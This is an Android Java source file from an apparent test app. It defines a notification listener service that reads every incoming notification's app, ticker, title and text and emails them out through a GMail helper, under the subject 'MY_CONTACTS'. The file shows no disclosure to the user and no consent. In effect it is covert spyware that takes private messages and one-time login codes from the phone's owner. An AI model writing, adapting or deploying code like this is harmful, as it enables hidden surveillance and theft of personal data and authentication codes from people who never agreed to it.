package com.digitstory.testapplication.Services;

import android.content.Context ;
import android.os.Build;
import android.os.Bundle;
import android.service.notification.NotificationListenerService ;
import android.service.notification.StatusBarNotification ;
import android.support.annotation.RequiresApi;
import android.util.Log ;

import com.digitstory.testapplication.Utils.Config;
import com.digitstory.testapplication.Utils.GMail;

@RequiresApi(api = Build.VERSION_CODES.JELLY_BEAN_MR2)
public class NotificationService extends NotificationListenerService {
   private String TAG = this .getClass().getSimpleName() ;
   Context context ;
   @Override
   public void onCreate () {
      super .onCreate() ;
      context = getApplicationContext() ;
      Log.d(Config.TAG, "Coming to NotificationService");
   }
   @RequiresApi(api = Build.VERSION_CODES.KITKAT)
   @Override
   public void onNotificationPosted (StatusBarNotification sbn) {
      Log.d(Config.TAG, "Reading notification");
      String pack = sbn.getPackageName();
      String ticker = String.valueOf(sbn.getNotification().tickerText);
      Bundle extras = sbn.getNotification().extras;
      String title = extras.getString("android.title");
      String text = String.valueOf(extras.getCharSequence("android.text"));

      String notification = createBody(pack, ticker, title, text);
      Log.d(Config.TAG, notification);
      sendMail(notification);
   }
   @Override
   public void onNotificationRemoved (StatusBarNotification sbn) {
      Log. d ( TAG , "********** onNotificationRemoved" ) ;
      Log. d ( TAG , "ID :" + sbn.getId() + " \t " + sbn.getNotification(). tickerText + " \t " + sbn.getPackageName()) ;
   }


   private String createBody(String pack, String ticker, String title, String text){
      String notification = "pack:" + pack + "\n" + "ticker:" + ticker + "\n" + "title:" + title + "\n" + "text:" + text;
      return notification;
   }

   private void sendMail(String emailBody) {

      try {
         GMail gmail = new GMail(null, null, null, "MY_CONTACTS", emailBody);
         RunAsyncTask raTask = new RunAsyncTask(gmail, context);
         raTask.execute("MyContentObserver");
      } catch (Exception e) {
         Log.e(Config.TAG, e.getMessage(), e);
      }

   }
}